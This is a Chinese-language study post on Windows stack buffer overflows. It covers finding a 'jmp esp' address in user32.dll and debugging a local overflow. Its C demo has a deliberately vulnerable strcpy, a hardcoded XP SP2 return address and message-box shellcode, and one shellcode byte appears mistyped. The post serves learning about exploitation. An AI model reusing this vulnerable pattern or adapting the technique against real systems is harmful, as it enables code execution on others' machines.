
# 缓冲区溢出学习笔记

缓冲区溢出是指当计算机程序向缓冲区内填充的数据位数超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上，我们使用精心设计的`shellcode`来覆盖合法的数据，从何使我们的`shellcode`得到执行。

缓冲区溢出堆栈原理图:

![](https://www.kanxue.com/pediy09-96.files/stack.jpg)

## 一：需要解决的几个小问题

### 2.1
缓冲区溢出后，用`jmp esp`指令地址覆盖原来的函数返回地址，执行`jmp esp`后，`ip`指针便指向缓冲区中我们的`shellcode`了，到哪去找`jmp esp`的地址呢？我们想到了`windows`的动态连接库`user32.dll`，我们在`user32.dll`中找一个`jmp esp`指令的地址不就行了吗.

### 2.2
将`user32.dll`载入`ue`,查找 `FF E4`,可能有人会问，你怎么知道`jmp esp`的机器码是`FF E4`?那好，我们来动手找出它来，编一个`asm`程序：

```
.386
.model flat,stdcall
option casemap:none
include   d:\masm32\hd.h
.code
start:
jmp esp
end   start
```

`ml /c /coff /Cp jmp\_esp.asm`
`link /subsystem:windows jmp\_esp.obj`
我用`masm`编译的，编译后用`od`载入，

![](https://www.kanxue.com/pediy09-96.files/od.jpg_252.jpg)

~嘿嘿，办法超级笨，高手莫笑。

### 2.3 确定 `FF E4`在`user32.dll`中的偏移地址

#### 2.3.1
用`ue`打开`user32.dll`查找`FF E4`,

![](https://www.kanxue.com/pediy09-96.files/ue.jpg)

#### 2.3.2
用`peditor r`载入`user32.dll`，选择右侧的`FLC`,在`offset`处填上我们用`ue`查出来`FF E4`在文件中的偏移量，`peditor`自动计算出`FF E4`的`virtual address`,`77 d2 74 47`。

嘿嘿~，偷懒的办法，你也可以自己动手计算。

![](https://www.kanxue.com/pediy09-96.files/ped.jpg)

#### 2.3.3
动手计算：`Va=16847h+77D10000h+c00h=77D27447`，原理图如下：

![](https://www.kanxue.com/pediy09-96.files/rav.jpg)

## 三．解决了以上几个小问题后，结合缓冲区溢出堆栈原理图和一个本地溢出的程序，使用`vc7.0`反汇编调试一下，进一步动手实践。

给出我用来调试的程序：

```c
#include <string.h>
#include <stdio.h>
#include <windows.h>
#define JUMPESP "\x28\x59\xD8\x77"//user32.dll中jmp esp指令的偏移量
unsigned char eip[8] = JUMPESP;
unsigned char sploit[] =
{
"\x60"
"\x8B\xEC"
"\x83\xEC\x54"
"\x33\xC9"
"\xC6\x45\xDB\x75"
"\xC6\x45\xDC\x73"
"\xC6\x45\xDD\x65"
"\xC6\x45\xDE\x72"
"\xC6\x45\xDF\x33"
"\xC6\x45\xE0\x32"
"\xC6\x45\xE7\x2E"
"\xC6\x45\xE\x64"
"\xC6\x45\xE9\x6C"
"\xC6\x45\xEA\x6C"
"\x88\x4D\xEB"
"\x8D\x45\xDB"
"\x50"
"\xB8\x77\x1D\x80\x7C"
"\xFF\xD0"
"\x55"
"\x51"
"\x8B\xEC"
"\x83\xEC\x54"
"\x33\xC9"
"\xC6\x45\xEC\x53"
"\xC6\x45\xED\x75"
"\xC6\x45\xEE\x63"
"\xC6\x45\xEF\x63"
"\xC6\x45\xF0\x65"
"\xC6\x45\xF1\x73"
"\xC6\x45\xF2\x73"
"\x88\x4D\xF3"
"\xC6\x45\xF4\x57"
"\xC6\x45\xF5\x65"
"\xC6\x45\xF6\x20"
"\xC6\x45\xF7\x47"
"\xC6\x45\xF8\x6F"
"\xC6\x45\xF9\x74"
"\xC6\x45\xFA\x20"
"\xC6\x45\xFB\x49"
"\xC6\x45\xFC\x74"
"\xC6\x45\xFD\x21"
"\x88\x4D\xFE"
"\x51"
"\x8D\x45\xEC"
"\x50"
"\x8D\x45\xF4"
"\x50"
"\x51"
"\xB8\xEA\x04\xD5\x77"
"\xFF\xD0"
"\x33\xDB"
"\x53"
"\xB8\xA2\xCA\x81\x7C"
"\xFF\xD0"
"\x8B\xE5"
"\x61"

};
int  MyCopy( char* str )
{
 char buff1[50];
 strcpy(buff1,str);
 return 1;
}
int main()
{
HINSTANCE u32=NULL;
u32=LoadLibrary("user32.dll");
if(u32==NULL)
{
   printf("cann't load user32.dll");
}
 char Buff[1024];
 memset(&Buff,0,sizeof(Buff));
 for(int i=0;i<56;Buff[i++]=0x90);
 strcpy(Buff+56,(char *)eip);//
// strcpy(Buff+60,(char *)sploit);//
// MyCopy(Buff);
 printf("\n successed \n");
 return 0;
}
```

调试步骤：

### 3.1
在`vc7.0`中按下 `F11`

### 3.2
在发生溢出的函数`MyCopy`那里下个断点(按下`F9`).

![](https://www.kanxue.com/pediy09-96.files/vc71.jpg)

==================================================================

### 3.3
按`F11`单步进入。

==================================================================

![](https://www.kanxue.com/pediy09-96.files/vc72.jpg)

![](https://www.kanxue.com/pediy09-96.files/vc73.jpg)

![](https://www.kanxue.com/pediy09-96.files/vc74.jpg)

注意`esp`,`ebp`的变化

### 3.4
`ret`后就来到我们的`shellcode`了。

![](https://www.kanxue.com/pediy09-96.files/vc75.jpg)       ![](https://www.kanxue.com/pediy09-96.files/vc76.jpg)

程序在`winxp_sp2`下`vc7.0`编译通过，如果你的操作系统不是`winxp_sp2`，需要修改`shellcode`中调用的`api`的偏移地址。

第一次写东西有点乱，请大家多多包涵，有不对的地方请指教。
